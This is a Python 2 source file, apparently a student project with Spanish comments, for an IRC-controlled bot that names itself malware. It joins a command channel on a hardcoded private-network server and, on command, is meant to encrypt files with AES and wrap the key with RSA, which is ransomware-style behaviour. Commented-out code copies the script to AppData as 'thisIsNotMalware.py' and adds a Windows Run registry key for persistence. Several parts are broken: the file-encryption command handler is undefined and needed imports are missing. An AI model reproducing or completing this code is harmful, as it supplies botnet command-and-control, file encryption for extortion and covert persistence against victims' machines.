# from _winreg import *
from shutil import copy

import os
import random
import socket
import sys
import string as st

CHANNEL = "#FerruscaHernandez"
# SERVER = "192.168.1.74"
# SERVER = "10.4.21.58"
SERVER = "172.16.150.128"
# NICKNAME = "abcd54"
IRC_PORT = 6667


IRC = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


def gen_nickname():
    lenNick = 5 
    listChoice = list(st.ascii_lowercase+st.digits)
    nick=""
    for x in range(lenNick):
        nick += random.choice(listChoice)
    return nick

def send(chan, msg):
    IRC.send("PRIVMSG " + chan + " " + msg + "\n")

def connect(server, channel, botnick, port):
    print "connecting to:"+server
    IRC.connect((server, port))                                                         
    IRC.send("USER " + botnick + " " + botnick +" " + botnick + " :This is a fun bot!\n")
    IRC.send("NICK " + botnick + "\n")               
    IRC.send("JOIN " + channel + "\n")        #join the chat

def get_text():
    text=IRC.recv(2040)  #receive the text

    if text.find('PING') != -1:                      
        IRC.send('PONG ' + text.split() [1] + 'r\n') 
    return text

def sayMyName(channel):
    send(channel, "Me llamo malware :o")

'''
Función creada por: Manzano Cruz Isaías Abraham
                    Rodríguez Gallardo Pedro Alejandro 
'''
def Cifra(key, fnamec):
	"""
	Recibe: La llave para cifrar el archivo y el nombre del archivo
	Devuelve: Archivo cifrado usando AES como metodo de cifrado
	"""
	chunksize=64*1024
	outputfile=fnamec+'.sca'
	filesize=str(os.path.getsize(fnamec)).zfill(16)
	IV=''
	llave_cifrada = CifraLlave(key)[0]
	#print 'Logitud de la llave:',len(llave_cifrada)
	for i in range(16):
		IV+=chr(random.randint(0,0xff))
	encryptor= AES.new(key, AES.MODE_CBC,IV)

	with open(fnamec, 'rb') as infile:
		with open(outputfile, 'wb') as outfile:
			outfile.write(filesize)
			outfile.write(IV)
			outfile.write(llave_cifrada)

			while True:
				chunk =infile.read(chunksize)
				if len(chunk)==0:
					break
				elif len(chunk) % 16 !=0:
					chunk+=' '*(16-(len(chunk)%16))
				outfile.write(encryptor.encrypt(chunk))

'''
Función creada por: Manzano Cruz Isaías Abraham
                    Rodríguez Gallardo Pedro Alejandro 
'''
def CreaLlave(key):
    """
    Recibe: Un texto plano que servira ser una llave
    Devuelve: Una llave de tamano constante la cual servira para cifrar el archivo
    """
    abcd = string.ascii_lowercase
    k = ''.join(random.choice(abcd) for i in range(random.randint(16,64)))
    hasher=SHA256.new(k)
    return hasher.hexdigest()[:16]

'''
Función creada por: Manzano Cruz Isaías Abraham
                    Rodríguez Gallardo Pedro Alejandro 
'''
def CifraLlave(llave):
	return rsa.encrypt(llave,32)


NICKNAME =  gen_nickname()
print NICKNAME
connect(SERVER, CHANNEL, NICKNAME, IRC_PORT)

while 1:
    text = get_text()
    print text

    message = text[3:]
 
    if text.find('PING'):
        send(CHANNEL, "PONG")
    
    if "PRIVMSG" in text and CHANNEL in text:
        if "!@cifraArchivo" in message:
            cifraArchivo(message)
        elif "como te llamas ?" in message:
            sayMyName(CHANNEL)
        elif "hello" in message:
            send(CHANNEL, "Hello!")



# shutil.copy(__file__, "C:\users\malware\appdata\roaming\thisIsNotMalware.py")

# # Writing Registry key
# keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
# try:
#     key = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
# except:
#     key = CreateKey(HKEY_CURRENT_USER, keyVal)
# # SetValueEx(key, "JLF", 0, REG_SZ, "C:\users\malware\appdata\roaming\thisIsNotMalware.py")
# SetValueEx(key, "JLF", 0, REG_EXPAND_SZ, "C:\users\%HOMEPATH%\appdata\roaming\thisIsNotMalware.py")
# CloseKey(key)

